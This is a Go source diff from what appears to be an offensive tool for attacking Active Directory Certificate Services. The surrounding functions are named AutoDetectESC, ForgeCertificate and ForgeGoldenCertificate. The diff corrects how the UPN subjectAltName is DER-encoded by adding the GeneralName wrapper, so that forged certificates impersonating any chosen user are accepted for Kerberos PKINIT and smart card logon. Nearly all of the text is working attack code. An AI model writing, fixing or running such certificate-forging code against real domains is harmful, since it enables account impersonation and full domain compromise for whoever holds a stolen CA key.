@@ -577,19 +577,32 @@ func AutoDetectESC(cfg *ADCSConfig) ([]CertTemplate, error) {
 // upnOtherName encodes a UPN as an ASN.1 OtherName SAN extension value.
 // OID 1.3.6.1.4.1.311.20.2.3 (szOID_NT_PRINCIPAL_NAME) — the correct format
 // for Kerberos PKINIT and Windows smart card logon.
+// upnOtherName encodes a UPN as a GeneralName OtherName for the SAN extension.
+// Returns bytes ready to be placed inside a SEQUENCE OF GeneralName.
+//
+// ASN.1 structure produced:
+//
+//	GeneralName [0] IMPLICIT {     -- tag 0xA0 (context class, constructed)
+//	  SEQUENCE {                   -- OtherName
+//	    OID 1.3.6.1.4.1.311.20.2.3
+//	    [0] EXPLICIT {
+//	      UTF8String "user@domain"
+//	    }
+//	  }
+//	}
 func upnOtherName(upn string) ([]byte, error) {
-	// OtherName ::= SEQUENCE { type-id OID, value [0] EXPLICIT ANY }
-	// The value for UPN is UTF8String.
-
 	// OID bytes for 1.3.6.1.4.1.311.20.2.3 (szOID_NT_PRINCIPAL_NAME)
 	oidBytes := []byte{0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03}
 
 	upnBytes := []byte(upn)
-	utf8Val := derTLV(0x0c, upnBytes)          // UTF8String
-	explicit0 := derTLV(0xa0, utf8Val)          // [0] EXPLICIT
-	inner := append(oidBytes, explicit0...)
-	result := derTLV(0x30, inner)               // SEQUENCE
-	return result, nil
+	utf8Val := derTLV(0x0c, upnBytes)      // UTF8String
+	explicit0 := derTLV(0xa0, utf8Val)      // [0] EXPLICIT wrapper for the value
+	otherNameSeq := append(oidBytes, explicit0...)
+
+	// Wrap as GeneralName OtherName: [0] IMPLICIT SEQUENCE
+	// Tag 0xA0 = context class (bit 7) + constructed (bit 5) + tag number 0
+	generalName := derTLV(0xa0, otherNameSeq)
+	return generalName, nil
 }
 
 // derTLV builds a DER tag-length-value encoding with proper multi-byte length
@@ -647,7 +660,7 @@ func ForgeCertificate(caKey crypto.PrivateKey, upn string) (*x509.Certificate, *
 		return nil, nil, fmt.Errorf("encode UPN SAN: %w", err)
 	}
 	// SubjectAltName extension: SEQUENCE OF GeneralName, where GeneralName [0] = OtherName
-	sanRaw := derTLV(0x30, upnSAN)
+	sanRaw := derTLV(0x30, upnSAN) // SEQUENCE OF GeneralName
 
 	template := &x509.Certificate{
 		SerialNumber: big.NewInt(1337),
@@ -781,7 +794,7 @@ func ForgeGoldenCertificate(caKey crypto.PrivateKey, caCert *x509.Certificate, u
 	if err != nil {
 		return nil, nil, fmt.Errorf("encode UPN SAN: %w", err)
 	}
-	sanRaw := derTLV(0x30, upnSAN)
+	sanRaw := derTLV(0x30, upnSAN) // SEQUENCE OF GeneralName
 
 	template := &x509.Certificate{
 		SerialNumber: serialNumber,
